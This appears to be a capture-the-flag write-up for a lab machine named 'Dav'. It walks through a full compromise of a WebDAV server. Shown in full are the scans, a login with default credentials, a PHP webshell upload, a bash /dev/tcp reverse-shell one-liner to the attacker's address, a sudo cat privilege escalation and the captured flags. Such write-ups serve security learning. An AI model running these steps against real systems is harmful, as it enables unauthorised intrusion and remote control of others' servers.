
# CTF Writeup: Dav

---

## Reconaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sS -p- 10.112.128.149                                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 14:07 CDT
Nmap scan report for 10.112.128.149
Host is up (0.0094s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds
```

The scan revealed that only an webpage is running on port 80. An more detailled scan revealed the following information abt the service.

```
nmap -n -Pn -sSCV -p 80 10.112.128.149
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-03 14:11 CDT
Nmap scan report for 10.112.128.149
Host is up (0.011s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

The webpage seems to be an default apache webpage.

Started off by enumerating endpoints.

```
gobuster dir -u http://10.112.128.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.128.149
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/webdav               (Status: 401) [Size: 461]
/server-status        (Status: 403) [Size: 302]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

The webdav endpoint requires authentication. 

SInce there was no other endpoints to retrieved, I decided to analyze the network package of an login try. I intercepted it using BurpSuite & FoxyProxy.

The HTTP Network Package had an non-default Attribute in the Header named "Authorization".

```
Authorization: Basic ZHdxZHF3OmRxd2R3cQ==
```

There is an embedded base64 encoded string. Let's decode it locally.

```
echo "ZHdxZHF3OmRxd2R3cQ==" | base64 -d
dwqdqw:dqwdwq
```

Login Credentials? No!

We searched up for default credentials for WebDAV and found some, which were working.

```
wampp:xampp
```

We used the tool "davtest" to check which file extensions we can use to execute and upload.

```
davtest -auth wampp:xampp -url http://10.112.128.149/webdav/
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.112.128.149/webdav
********************************************************
NOTE    Random string for this session: yEGSEEW1JOM
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM
********************************************************
 Sending test files
PUT     pl      SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.pl
PUT     php     SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.php
PUT     aspx    SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.aspx
PUT     txt     SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.txt
PUT     html    SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.html
PUT     cfm     SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.cfm
PUT     asp     SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.asp
PUT     jsp     SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.jsp
PUT     cgi     SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.cgi
PUT     jhtml   SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.jhtml
PUT     shtml   SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.shtml
********************************************************
 Checking for test file execution
EXEC    pl      FAIL
EXEC    php     SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.php
EXEC    php     FAIL
EXEC    aspx    FAIL
EXEC    txt     SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.txt
EXEC    txt     FAIL
EXEC    html    SUCCEED:        http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.html
EXEC    html    FAIL
EXEC    cfm     FAIL
EXEC    asp     FAIL
EXEC    jsp     FAIL
EXEC    cgi     FAIL
EXEC    jhtml   FAIL
EXEC    shtml   FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.pl
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.php
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.aspx
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.txt
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.html
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.cfm
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.asp
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.jsp
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.cgi
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.jhtml
PUT File: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.shtml
Executes: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.php
Executes: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.txt
Executes: http://10.112.128.149/webdav/DavTestDir_yEGSEEW1JOM/davtest_yEGSEEW1JOM.html
```

From this output we can see that we are able to upload and execute .php files. Let's upload an webshell.

I utilized the tool "cadaver" for this use-case.

```
cadaver http://10.112.128.149/webdav
Authentication required for webdav on server `10.112.128.149':
Username: wampp
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
Coll:   DavTestDir_yEGSEEW1JOM                 0  May  3 14:56
        passwd.dav                            44  Aug 25  2019
dav:/webdav/> put wolfswebshell.php 
Uploading wolfswebshell.php to `/webdav/wolfswebshell.php':
Progress: [=============================>] 100.0% of 7205 bytes succeeded.
dav:/webdav/>
```

After uploading the webshell, I viewed it in the browser and gained command execution.

I started an netcat listener on my local machine.

```
nc -lvnp 80
```

Executed the following command in the webshell.

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.227.246/80 0>&1'
```

Gained RCE as user "www-data".

```
nc -lvnp 80    
listening on [any] 80 ...
connect to [192.168.227.246] from (UNKNOWN) [10.112.128.149] 54686
bash: cannot set terminal process group (712): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/webdav$
```

Retrieved user.txt in /home/merlin directory.

```
449b40fe93f78a938523b7e4dcd66d2a
```

I reviewed sudo permissions of user "www-data" and we are able to run the cat binary.

```
www-data@ubuntu:/var/www/html/webdav$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```

Displayed root.txt in /root directory using the cat binary with sudo permissions.

```
www-data@ubuntu:/var/www/html/webdav$ sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```